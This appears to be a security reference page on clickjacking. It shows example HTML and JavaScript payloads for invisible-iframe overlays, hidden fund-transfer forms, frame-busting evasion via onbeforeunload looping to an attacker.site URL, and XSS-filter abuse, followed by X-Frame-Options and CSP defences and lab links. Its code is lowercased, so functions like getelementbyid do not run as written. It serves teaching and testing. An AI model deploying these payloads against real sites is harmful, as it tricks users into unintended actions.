# clickjacking

> clickjacking is a type of web security vulnerability where a malicious website tricks a user into clicking on something different from what the user perceives, potentially causing the user to perform unintended actions without their knowledge or consent. users are tricked into performing all sorts of unintended actions as such as typing in the password, clicking on ‘delete my account' button, liking a post, deleting a post, commenting on a blog. in other words all the actions that a normal user can do on a legitimate website can be done using clickjacking.

## summary

* [tools](#tools)
* [methodology](#methodology)
    * [ui redressing](#ui-redressing)
    * [invisible frames](#invisible-frames)
    * [button/form hijacking](#buttonform-hijacking)
    * [execution methods](#execution-methods)
* [preventive measures](#preventive-measures)
    * [implement x-frame-options header](#implement-x-frame-options-header)
    * [content security policy (csp)](#content-security-policy-csp)
    * [disabling javascript](#disabling-javascript)
* [onbeforeunload event](#onbeforeunload-event)
* [xss filter](#xss-filter)
    * [ie8 xss filter](#ie8-xss-filter)
    * [chrome 4.0 xssauditor filter](#chrome-40-xssauditor-filter)
* [challenge](#challenge)
* [labs](#labs)
* [references](#references)

## tools

* [portswigger/burp](https://portswigger.net/burp)
* [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
* [machine1337/clickjack](https://github.com/machine1337/clickjack)


## methodology

### ui redressing

ui redressing is a clickjacking technique where an attacker overlays a transparent ui element on top of a legitimate website or application. 
the transparent ui element contains malicious content or actions that are visually hidden from the user. by manipulating the transparency and positioning of elements, 
the attacker can trick the user into interacting with the hidden content, believing they are interacting with the visible interface.

* **how ui redressing works:**
    * overlaying transparent element: the attacker creates a transparent html element (usually a `<div>`) that covers the entire visible area of a legitimate website. this element is made transparent using css properties like `opacity: 0;`.
    * positioning and layering: by setting the css properties such as `position: absolute; top: 0; left: 0;`, the transparent element is positioned to cover the entire viewport. since it's transparent, the user doesn't see it.
    * misleading user interaction: the attacker places deceptive elements within the transparent container, such as fake buttons, links, or forms. these elements perform actions when clicked, but the user is unaware of their presence due to the overlaying transparent ui element.
    * user interaction: when the user interacts with the visible interface, they are unknowingly interacting with the hidden elements due to the transparent overlay. this interaction can lead to unintended actions or unauthorized operations.

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">click me</a>
</div>
```

### invisible frames

invisible frames is a clickjacking technique where attackers use hidden iframes to trick users into interacting with content from another website unknowingly. 
these iframes are made invisible by setting their dimensions to zero (height: 0; width: 0;) and removing their borders (border: none;). 
the content inside these invisible frames can be malicious, such as phishing forms, malware downloads, or any other harmful actions.

* **how invisible frames work:**
    * hidden iframe creation: the attacker includes an `<iframe>` element in a webpage, setting its dimensions to zero and removing its border, making it invisible to the user.

      ```html
      <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
      ```

    * loading malicious content: the src attribute of the iframe points to a malicious website or resource controlled by the attacker. this content is loaded silently without the user's knowledge because the iframe is invisible.
    * user interaction: the attacker overlays enticing elements on top of the invisible iframe, making it seem like the user is interacting with the visible interface. for instance, the attacker might position a transparent button over the invisible iframe. when the user clicks the button, they are essentially clicking on the hidden content within the iframe.
    * unintended actions: since the user is unaware of the invisible iframe, their interactions can lead to unintended actions, such as submitting forms, clicking on malicious links, or even performing financial transactions without their consent.


### button/form hijacking

button/form hijacking is a clickjacking technique where attackers trick users into interacting with invisible or hidden buttons/forms, leading to unintended actions on a legitimate website. by overlaying deceptive elements on top of visible buttons or forms, attackers can manipulate user interactions to perform malicious actions without the user's knowledge.

* **how button/form hijacking works:**
    * visible interface: the attacker presents a visible button or form to the user, encouraging them to click or interact with it.

    ```html
    <button onclick="submitform()">click me</button>
    ```
    
    * invisible overlay: the attacker overlays this visible button or form with an invisible or transparent element that contains a malicious action, such as submitting a hidden form.

    ```html
    <form action="malicious-site" method="post" id="hidden-form" style="display: none;">
    <!-- hidden form fields -->
    </form>
    ```

    * deceptive interaction: when the user clicks the visible button, they are unknowingly interacting with the hidden form due to the invisible overlay. the form is submitted, potentially causing unauthorized actions or data leakage.

    ```html
    <button onclick="submitform()">click me</button>
    <form action="legitimate-site" method="post" id="hidden-form">
      <!-- hidden form fields -->
    </form>
    <script>
      function submitform() {
        document.getelementbyid('hidden-form').submit();
      }
    </script>
    ```

### execution methods

* creating hidden form: the attacker creates a hidden form containing malicious input fields, targeting a vulnerable action on the victim's website. this form remains invisible to the user.

```html
  <form action="malicious-site" method="post" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
  </form>
```

* overlaying visible element: the attacker overlays a visible element (button or form) on their malicious page, encouraging users to interact with it. when the user clicks the visible element, they unknowingly trigger the hidden form's submission.

```js
  function submitform() {
    document.getelementbyid('hidden-form').submit();
  }
```


## preventive measures

### implement x-frame-options header

implement the x-frame-options header with the deny or sameorigin directive to prevent your website from being embedded within an iframe without your consent.

```apache
header always append x-frame-options sameorigin
```

### content security policy (csp)

use csp to control the sources from which content can be loaded on your website, including scripts, styles, and frames. 
define a strong csp policy to prevent unauthorized framing and loading of external resources.
example in html meta tag:

```html
<meta http-equiv="content-security-policy" content="frame-ancestors 'self';">
```

### disabling javascript

* since these type of client side protections relies on javascript frame busting code, if the victim has javascript disabled or it is possible for an attacker to disable javascript code, the web page will not have any protection mechanism against clickjacking.
* there are three deactivation techniques that can be used with frames:
    * restricted frames with internet explorer: starting from ie6, a frame can have the "security" attribute that, if it is set to the value "restricted", ensures that javascript code, activex controls, and re-directs to other sites do not work in the frame.

    ```html
    <iframe src="http://target site" security="restricted"></iframe>
    ```

    * sandbox attribute: with html5 there is a new attribute called “sandbox”. it enables a set of restrictions on content loaded into the iframe. at this moment this attribute is only compatible with chrome and safari.

    ```html
    <iframe src="http://target site" sandbox></iframe>
    ```

## onbeforeunload event

* the `onbeforeunload` event could be used to evade frame busting code. this event is called when the frame busting code wants to destroy the iframe by loading the url in the whole web page and not only in the iframe. the handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. when this string is displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.

* the attacker can use this attack by registering an unload event on the top page using the following example code:

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

* the previous technique requires the user interaction but, the same result, can be achieved without prompting the user. to do this the attacker have to automatically cancel the incoming navigation request in an onbeforeunload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a _"http/1.1 204 no content"_ header.

_204 page:_

```php
<?php
    header("http/1.1 204 no content");
?>
```

_attacker's page_

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setinterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```

## xss filter

### ie8 xss filter 
this filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected xss attempts. when the filter identifies a possible xss attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). for this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request's parameters.

```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```

attacker view:

```html
<iframe src=”http://target site/?param=<script>if”>
```

### chrome 4.0 xssauditor filter

it has a little different behaviour compared to ie8 xss filter, in fact with this filter an attacker could deactivate a “script” by passing its code in a request parameter. this enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.

attacker view:

```html
<iframe src=”http://target site/?param=if(top+!%3d+self)+%7b+top.location%3dself.location%3b+%7d”>
```

## challenge

inspect the following code:

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getelementsbytagname('iframe')[0].contentwindow.location='malicious-site.com';">click me</button>
```

determine the clickjacking vulnerability within this code snippet. identify how the hidden iframe is being used to exploit the user's actions when they click the button, leading them to a malicious website.


## labs

* [owasp webgoat](https://owasp.org/www-project-webgoat/)
* [owasp client side clickjacking test](https://owasp.org/www-project-web-security-testing-guide/v41/4-web_application_security_testing/11-client_side_testing/09-testing_for_clickjacking)


## references

- [clickjacker.io - saurabh banawar - may 10, 2020](https://clickjacker.io)
- [clickjacking - gustav rydstedt - april 28, 2020](https://owasp.org/www-community/attacks/clickjacking)
- [synopsys clickjacking - blackduck - november 29, 2019](https://www.synopsys.com/glossary/what-is-clickjacking.html#b)
- [web-security clickjacking - portswigger - october 12, 2019](https://portswigger.net/web-security/clickjacking)